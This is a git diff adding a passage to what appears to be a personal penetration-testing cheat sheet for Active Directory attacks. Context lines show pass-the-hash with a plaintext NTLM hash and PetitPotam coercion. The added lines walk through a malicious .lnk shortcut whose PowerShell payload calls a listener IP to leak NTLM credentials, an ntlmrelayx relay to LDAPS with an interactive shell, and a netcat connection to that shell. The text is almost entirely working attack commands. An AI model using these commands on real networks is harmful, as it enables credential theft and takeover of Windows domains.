@@ -487,6 +487,31 @@ nxc smb 192.168.100.101  -u brandon.keywarp -H db03d6a77a2205bc1d07082740626cc9 
 python3 PetitPotam.py -u brandon.keywarp -no-pass -hashes ':db03d6a77a2205bc1d07082740626cc9' -pipe all 'MS01@5050/colosion'  192.168.100.101
 ```
 
+Not about a `NTLM` phishing but a `ldap-shell` capture
+
+Malicious .lnk creation `Folder -> Create a shortcut`
+
+Paste payload
+
+```bash
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://listener_ip' -UseDefaultCredentials"
+```
+
+I don't file how to do this in linux machine
+
+And start a `impacket-ntlmrelayx`
+
+```bash
+sudo ntlmrelayx.py -t ldaps://dc_ip -wh listener_ip --http-port '80,8080' -i --no-smb-server
+```
+
+Connect to `ldap-shell`
+
+```bash
+nc.exe 127.0.0.1 11000
+```
+
+
 [[Backups]]
 == Backups
 
